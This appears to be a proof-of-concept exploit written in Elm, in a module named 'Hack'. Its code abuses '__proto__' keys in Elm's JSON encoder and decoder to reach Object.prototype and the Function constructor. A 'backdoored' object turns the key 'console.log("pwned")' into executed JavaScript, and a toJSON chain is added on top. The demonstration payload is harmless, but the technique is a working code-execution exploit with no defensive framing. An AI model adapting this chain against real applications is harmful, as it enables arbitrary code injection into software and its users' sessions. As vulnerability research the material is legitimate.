module Hack exposing (main)

import Html exposing (Html)
import Json.Decode as JD exposing (Decoder, Value)
import Json.Encode as JE


protoDecoder : Decoder Value
protoDecoder =
    JD.field "__proto__" JD.value


objectProto : JD.Value
objectProto =
    JD.decodeValue protoDecoder (JE.object [])
        |> Result.withDefault
            (JE.string "getting __proto__ failed")


toString : Value
toString =
    get "toString" (JE.object [])


functionConstructor : Value
functionConstructor =
    get "constructor" toString


doubleProto : Result JD.Error {}
doubleProto =
    JD.decodeValue (JD.succeed {})
        (JE.object
            [ ( "__proto__"
              , JE.object [ ( "__proto__", objectProto ) ]
              )
            ]
        )


backdoored : Value
backdoored =
    JE.object
        [ ( "console.log(\"pwned\")", JE.null )
        , ( "__proto__"
          , JE.object
                [ ( "hasOwnProperty"
                  , functionConstructor
                  )
                ]
          )
        ]


weirdMachine : Result JD.Error (List ( String, () ))
weirdMachine =
    JD.decodeValue
        (JD.keyValuePairs (JD.succeed ()))
        backdoored


hunt : Value -> List ( String, Value )
hunt q =
    JD.decodeValue
        (JD.keyValuePairs JD.value)
        (JE.object [ ( "__proto__", q ) ])
        |> Result.withDefault [ ( "FAILED to hunt", JE.null ) ]


abusingToJson =
    JE.object
        [ ( "key"
          , JE.object
                [ ( "toJSON"
                  , JE.object
                        [ ( "toJSON"
                          , functionConstructor
                          )
                        ]
                  )
                ]
          )
        ]


encoded =
    weirdMachine
        |> Debug.log "encoded"


main : Html msg
main =
    let
        _ =
            encoded
    in
    abusingToJson
        |> hunt
        |> List.concatMap
            (\( k, v ) ->
                [ Html.dt [] [ Html.text k ]
                , Html.dd [] [ Html.text (JE.encode 0 v) ]
                ]
            )
        |> Html.dl []


get : String -> Value -> Value
get key value =
    let
        confused : Value
        confused =
            JE.object
                [ ( "__proto__", value )
                ]

        decoder : Decoder Value
        decoder =
            JD.field key JD.value
    in
    case JD.decodeValue decoder confused of
        Ok v ->
            v

        Err _ ->
            JE.string ("get " ++ key ++ " failed")


getResult : String -> Value -> Result JD.Error Value
getResult key value =
    let
        confused : Value
        confused =
            JE.object
                [ ( "__proto__", value )
                ]

        decoder : Decoder Value
        decoder =
            JD.field key JD.value
    in
    JD.decodeValue decoder confused
